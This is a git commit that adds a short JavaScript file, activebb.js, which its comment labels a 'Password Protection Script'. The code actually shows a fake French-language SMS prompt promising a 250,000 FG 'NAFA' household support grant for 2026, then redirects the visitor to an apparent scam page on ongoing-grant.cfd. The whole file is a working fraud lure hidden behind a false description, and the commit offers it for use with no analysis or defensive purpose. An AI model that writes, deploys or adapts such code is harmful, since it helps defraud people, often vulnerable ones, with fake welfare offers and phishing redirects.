fa0d4eb835d1c11bcfbc830ebad9e165993c44e5
The-ongoing <preciousadaowo4@gmail.com>
2026-01-31 01:59:29 +0100

    Create activebb.js

---
+++ activebb.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER DE L’ARGENT LIQUIDE'
+password = prompt(
+  'SMS: Félicitations ! Vous êtes éligible pour recevoir la subvention de soutien NAFA de 250 000 FG 2026. Veuillez appuyer sur OK pour recevoir immédiatement.',
+  'RETIRER DE L’ARGENT LIQUIDE'
+);
+if (password != 'RETIRER DE L’ARGENT LIQUIDE') {
+  location.href = 'https://ongoing-grant.cfd/Nafa-Soutien-Aux-Menages.html';
+  }
